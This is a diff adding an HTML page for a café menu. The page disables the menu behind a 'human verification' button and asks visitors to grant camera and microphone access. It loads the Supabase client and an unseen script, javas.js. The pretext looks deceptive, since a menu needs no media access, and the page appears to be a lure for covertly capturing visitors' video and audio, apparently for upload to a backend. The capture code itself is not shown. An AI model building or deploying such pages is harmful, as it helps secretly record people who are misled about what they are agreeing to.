@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Naveed Café Menu</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fdf5e6; color: #4b2e2e; margin: 0; padding: 0; }
+        header { background-color: #4b2e2e; color: white; padding: 25px; text-align: center; }
+        .container { max-width: 700px; margin: 30px auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        
+        #showProductsBtn { 
+            display: block; width: 80%; margin: 20px auto; padding: 18px; 
+            background-color: #ff4757; color: white; border: none; border-radius: 8px; 
+            cursor: pointer; font-size: 18px; font-weight: bold; transition: 0.3s;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .menu-item { border-bottom: 1px solid #eee; padding: 15px 0; display: flex; justify-content: space-between; }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Naveed Café Exclusive Menu</h1>
+</header>
+
+<div class="container">
+    <p style="font-size: 16px; line-height:1.5;">Welcome to Naveed Café!  We limit our exclusive menu to real customers only.  For your safety and ours, we perform a <strong>one-time, privacy‑respecting verification</strong> using your camera and microphone.</p>
+    <button id="showProductsBtn">Start Human Verification</button>
+
+    <div id="menu-list" style="opacity: 0.3; pointer-events: none;">
+        <h3>Our Specialties:</h3>
+        <div class="menu-item"><span>Artisan Espresso</span> <span>$3.50</span></div>
+        <div class="menu-item"><span>Velvet Cappuccino</span> <span>$4.50</span></div>
+        <div class="menu-item"><span>Signature Caramel Latte</span> <span>$5.00</span></div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="javas.js"></script>
+</body>
+</html>
